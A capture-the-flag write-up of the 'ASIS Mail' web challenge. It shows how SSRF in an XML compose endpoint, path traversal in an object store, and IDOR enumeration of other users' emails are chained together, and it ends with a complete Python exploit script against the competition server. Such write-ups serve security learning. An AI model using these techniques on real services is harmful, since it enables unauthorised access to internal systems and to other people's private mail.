# ASIS Mail - Chaining Vulnerabilities

**Category:** Web
**Flag:** `ASIS{M4IL_4S_4_S3RVIC3_15UUUUUUE5_62ee9c3cc5029d4c}`

## The Application

ASIS Mail was a microservices-based email application - the kind of architecture that's popular in modern web development. It had multiple services working together: an nginx frontend, a Go API server, a Node.js SSO service, a Python/Flask object storage system, and PostgreSQL for the database.

The source code was provided, which was helpful. I could see exactly how these services communicated with each other and where the security boundaries were supposed to be.

## Finding the First Vulnerability

I started by exploring the API endpoints. The `/compose` endpoint looked interesting - it accepted XML to create email messages and could fetch attachments from URLs:

```xml
<message>
    <to>myuser@asismail.local</to>
    <subject>Test</subject>
    <body>test content</body>
    <attachment_url>http://internal-service/path</attachment_url>
</message>
```

This was SSRF - Server-Side Request Forgery. The API would fetch whatever URL I gave it and store the result as an attachment. But I couldn't just point it at `http://objectstore:8082/public/FLAG/flag.txt` because the object storage had checks for the FLAG bucket.

## The Object Storage Vulnerability

Looking at the object storage code, I found something interesting:

```python
@app.route("/public/<bucket>/<path:object_name>", methods=["GET"])
def public_file(bucket, object_name):
    if bucket == "FLAG":
        return jsonify({"error":"forbidden"}), 403
    file_path = STORAGE / bucket / object_name
    if not file_path.exists():
        return jsonify({"error":"not found"}), 404
    return send_file(file_path, as_attachment=True)
```

The code checked if the bucket name was "FLAG", but it didn't sanitize the `object_name` parameter. This meant I could use path traversal with `../` to escape from my bucket into the FLAG bucket.

If I used my user ID (let's say 691) as the bucket, then: `/public/691/../FLAG/flag-xxx.txt` would resolve to `/data/FLAG/flag-xxx.txt` and bypass the check.

## Finding the Flag Filename

But there was a problem: I didn't know the exact filename. According to the Dockerfile, the flag was renamed to `flag-<md5sum>.txt` where the MD5 was computed from the flag content itself.

That's when I discovered another vulnerability - IDOR (Insecure Direct Object Reference) in the email access endpoint. I could read ANY user's email by just changing the email ID:

```python
for email_id in range(1, 800):
    resp = session.get(f"{BASE_URL}/api/mail/{email_id}", headers=headers)
    # Check for attachments with flag filenames
```

By scanning other users' emails, I found they had tried various flag filenames. The most common one appearing was `flag-0750c96cfc2bd4b665865da15e9d5b94.txt`. Other competitors had obviously found the filename somehow.

I verified it existed using the hash endpoint (which didn't have the FLAG check):

```
GET /files/public/x/../FLAG/flag-0750c96cfc2bd4b665865da15e9d5b94.txt/hash
Response: {"content":"a69e461b31f79128...","status":"ok"}
```

Perfect. The file existed.

## Chaining It All Together

Now I had all the pieces:
1. SSRF in the compose endpoint
2. Path traversal in object storage
3. The correct flag filename

I registered a new account and used the compose endpoint to fetch the flag via SSRF:

```python
username = f"exploit_{random_string()}"
session.post(f"{BASE_URL}/sso/register", json={"username": username, "password": password})
resp = session.post(f"{BASE_URL}/sso/login", json={"username": username, "password": password})
user_id = resp.json().get("user", {}).get("userId")

# Use path traversal with my own user ID as the bucket
ssrf_url = f"http://objectstore:8082/public/{user_id}/../FLAG/flag-0750c96cfc2bd4b665865da15e9d5b94.txt"

xml = f'''<message>
    <to>{username}@asismail.local</to>
    <subject>GetFlag</subject>
    <body>flag</body>
    <attachment_url>{ssrf_url}</attachment_url>
</message>'''

session.post(f"{BASE_URL}/api/compose", headers=headers, files={"xml": (None, xml)})
```

The API made the request internally (bypassing nginx restrictions), the path traversal worked, and the flag was stored as an attachment in my inbox. I retrieved it from my email:

```
ASIS{M4IL_4S_4_S3RVIC3_15UUUUUUE5_62ee9c3cc5029d4c}
```

## The Exploit

Here's the complete exploit:

```python
#!/usr/bin/env python3
import requests
import random
import string
import time

BASE_URL = "http://91.107.143.167:8081"
FLAG_FILENAME = "flag-0750c96cfc2bd4b665865da15e9d5b94.txt"

def random_string(length=8):
    return ''.join(random.choices(string.ascii_lowercase, k=length))

def main():
    session = requests.Session()

    # Register and login
    username = f"exploit_{random_string()}"
    password = "ExploitPass123!"

    session.post(f"{BASE_URL}/sso/register", json={"username": username, "password": password})
    resp = session.post(f"{BASE_URL}/sso/login", json={"username": username, "password": password})
    data = resp.json()
    token = data.get("token")
    user_id = data.get("user", {}).get("userId")
    headers = {"Authorization": f"Bearer {token}"}
    my_email = f"{username}@asismail.local"

    print(f"User: {username} (ID: {user_id})")

    # SSRF with path traversal using our own bucket
    ssrf_url = f"http://objectstore:8082/public/{user_id}/../FLAG/{FLAG_FILENAME}"

    xml = f'''<message>
    <to>{my_email}</to>
    <subject>GetFlag</subject>
    <body>flag</body>
    <attachment_url>{ssrf_url}</attachment_url>
</message>'''

    resp = session.post(f"{BASE_URL}/api/compose", headers=headers, files={"xml": (None, xml)})
    print(f"Compose: {resp.status_code}")

    time.sleep(1)

    # Retrieve flag from inbox
    resp = session.get(f"{BASE_URL}/api/inbox", headers=headers)
    for email in resp.json():
        if email.get("subject") == "GetFlag":
            email_resp = session.get(f"{BASE_URL}/api/mail/{email['id']}", headers=headers)
            email_data = email_resp.json()

            for att in email_data.get("attachments", []):
                att_url = f"/files{att.get('url')}"
                r = session.get(f"{BASE_URL}{att_url}")
                if "ASIS{" in r.text:
                    print(f"\nFLAG: {r.text}")
                    return

if __name__ == "__main__":
    main()
```

